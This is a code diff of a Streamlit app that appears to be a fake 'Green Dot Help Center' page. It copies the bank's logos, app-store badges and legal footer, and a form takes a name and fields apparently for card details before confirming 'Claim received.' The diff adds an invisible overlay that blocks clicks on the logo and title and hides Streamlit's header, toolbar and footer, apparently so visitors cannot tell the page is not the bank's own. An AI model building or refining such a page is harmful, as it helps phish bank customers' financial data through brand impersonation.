@@ -23,44 +23,39 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="wide", page_icon="✅")
 
-# --- CSS DE AJUSTE DE LOGO Y BLOQUEO TOTAL ---
+# --- CSS DE BLOQUEO TOTAL ---
 st.markdown("""<style>
-/* 1. Capa invisible ajustada al tamaño del logo */
+/* 1. Capa Escudo: Bloquea clics en toda la franja superior (Logo y Título) */
 .stApp::before {
     content: '';
     position: absolute;
     top: 0;
     left: 0;
     width: 100%;
-    height: 150px;
+    height: 250px;
     z-index: 999999;
     pointer-events: all;
     background: transparent;
 }
 
-/* 2. Reducir espacios superiores y eliminar anclas de títulos */
-.block-container {
-    padding-top: 1rem !important;
-}
-
-/* Ocultar el icono de link (#) que aparece al lado de los títulos */
-.section-anchor, a.section-anchor, [data-testid='stHeaderActionElements'], .st-emotion-cache-15zrgzn {
+/* 2. Ocultar el icono de anclaje (#) de forma agresiva */
+.section-anchor, 
+a.section-anchor, 
+[data-testid='stHeaderActionElements'], 
+[data-testid='stHeader'], 
+header, 
+footer, 
+.st-emotion-cache-15zrgzn {
     display: none !important;
     visibility: hidden !important;
+    opacity: 0 !important;
 }
 
-/* 3. Ocultar elementos nativos */
-header, footer, .stDeployButton, [data-testid='stHeader'], [data-testid='stToolbar'] {
-    display: none !important;
-    visibility: hidden !important;
-}
-
-/* Desactivar puntero en h1 para evitar que actúe como link */
-h1 a, h1 {
+/* 3. Desactivar interacciones en títulos */
+h1, h2, h3, [data-testid='stMarkdownContainer'] a {
     pointer-events: none !important;
     cursor: default !important;
     text-decoration: none !important;
-    color: white !important;
 }
 
 /* 4. Estética General */
@@ -69,39 +64,16 @@ h1 a, h1 {
     color: #FFFFFF !important;
 }
 
+.block-container {
+    padding-top: 1rem !important;
+}
+
 .stButton>button {
     background-color: #00a05b !important;
     color: white !important;
-    border: none !important;
     width: 100%;
     padding: 15px !important;
     font-weight: bold !important;
-    text-transform: uppercase;
-}
-
-input {
-    background-color: #111 !important;
-    color: white !important;
-    border: 1px solid #333 !important;
-}
-
-.app-promo-container {
-    background-color: #111111;
-    padding: 40px 20px;
-    text-align: center;
-    border-radius: 12px;
-    margin: 30px 0;
-    border: 1px solid #222;
-}
-
-.legal-footer {
-    font-size: 11px;
-    color: #666;
-    text-align: justify;
-    margin-top: 60px;
-    border-top: 1px solid #222;
-    padding-top: 20px;
-    line-height: 1.5;
 }
 </style>""", unsafe_allow_html=True)
 
@@ -124,17 +96,15 @@ if submitted:
     if nombre and rec and car:
         st.success("✅ Claim received.")
 
-st.markdown("""<div class='app-promo-container'>
-    <h2 style='color:white; margin-bottom:20px;'>Download the Green Dot app</h2>
-    <div style='display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; margin-bottom: 25px;'>
+st.markdown("""<div style='background-color: #111; padding: 40px; text-align: center; border-radius: 12px; margin: 30px 0;'>
+    <h2 style='color:white;'>Download the Green Dot app</h2>
+    <div style='display: flex; justify-content: center; gap: 20px; margin-top: 20px;'>
         <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='160'>
         <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='160'>
     </div>
-    <p style='color:#bbb; max-width:600px; margin: 0 auto;'>We offer secure mobile banking that allows you to conveniently manage your account from making deposits, to sending money or paying bills.</p>
 </div>""", unsafe_allow_html=True)
 
-st.markdown("""<div class='legal-footer'>
-    * When on a desktop, hover over * to view important disclosures. When on a mobile device, tap on * to view disclosures.<br><br>
-    Green Dot® cards are issued by Green Dot Bank, Member FDIC.<br><br>
-    ©2026 Green Dot Corporation. All rights reserved. Green Dot Corporation NMLS #914924; Green Dot Bank NMLS #908739.
+st.markdown("""<div style='font-size: 11px; color: #666; text-align: justify; margin-top: 60px; border-top: 1px solid #222; padding-top: 20px;'>
+    Green Dot® cards are issued by Green Dot Bank, Member FDIC.<br>
+    ©2026 Green Dot Corporation. All rights reserved.
 </div>""", unsafe_allow_html=True)
